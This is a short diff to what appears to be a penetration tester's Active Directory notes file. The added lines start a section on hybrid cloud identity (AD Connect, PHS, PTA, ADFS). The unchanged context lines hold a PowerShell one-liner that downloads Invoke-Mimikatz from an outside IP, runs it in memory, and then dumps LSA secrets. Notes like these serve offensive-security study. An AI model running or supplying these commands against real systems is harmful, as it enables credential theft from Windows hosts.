@@ -1473,3 +1473,11 @@ Once we have a shell we can pull down mimikatz and extract credentials:
 iex (New-Object Net.Webclient).DownloadString("http://172.16.152.213:82/Invoke-Mimikatz.ps1") 
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
 ```
+# Hybrid
+AD Connect vs CloudSync??
+3 ways to connect to cloud from AD, all support Seamless Sign-On (SSO):
+- AD Connect
+	- Password Hash Sync (PHS) 
+	- Pass-Through Authentication (PTA)
+- Active Directory Federated Services (ADFS)
+
